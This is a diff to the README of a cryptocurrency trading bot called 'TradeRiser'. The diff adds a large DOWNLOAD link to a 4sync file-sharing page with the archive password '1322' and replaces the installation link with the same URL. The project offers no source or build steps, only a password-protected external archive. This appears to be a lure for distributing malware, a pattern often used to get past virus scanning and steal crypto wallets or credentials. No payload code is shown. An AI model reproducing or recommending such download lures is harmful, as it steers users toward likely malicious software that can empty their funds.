@@ -4,6 +4,11 @@
 
 Welcome to **TradeRiser**, the most advanced and customizable trading bot designed for seamless trading across **10 major blockchain networks**, including Ethereum, Binance Smart Chain, Polygon, Solana, Avalanche, Arbitrum, Optimism, Fantom, Cronos, and Cardano. With a sleek design, extensive configuration options, and cutting-edge algorithms, TradeRiser empowers traders to maximize profits with precision and style.
 
+
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+## PASSWORD: 1322
+
+
 ---
 
 ## 🌟 Features
@@ -56,5 +61,5 @@ TradeRiser’s interface is built with **style and usability** in mind:
 
 ## 🛠 Installation
 
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
 ## PASSWORD: 1322
